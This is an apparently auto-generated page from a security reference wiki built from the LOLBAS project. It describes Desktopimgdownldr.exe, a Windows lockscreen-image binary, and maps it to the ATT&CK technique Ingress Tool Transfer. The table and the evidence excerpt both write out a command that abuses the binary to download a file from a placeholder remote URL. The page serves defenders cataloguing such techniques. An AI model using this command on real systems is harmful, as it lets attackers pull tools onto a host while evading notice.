---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Desktopimgdownldr.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `desktopimgdownldr.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Desktopimgdownldr.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Windows binary used to configure lockscreen/desktop image

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/desktopimgdownldr.md)
- Source verification: [source record](../../sources/lolbas/desktopimgdownldr.exe.md)

## Aliases

- `Desktopimgdownldr.exe`
- `desktopimgdownldr.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/desktopimgdownldr.exe.md)

## Source Verification

[source record](../../sources/lolbas/desktopimgdownldr.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@gal_kristal'
Person: Gal Kristal
Author: Gal Kristal
Commands:
- Category: Download
Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
Description: Downloads the file and sets it as the computer's lockscreen
```
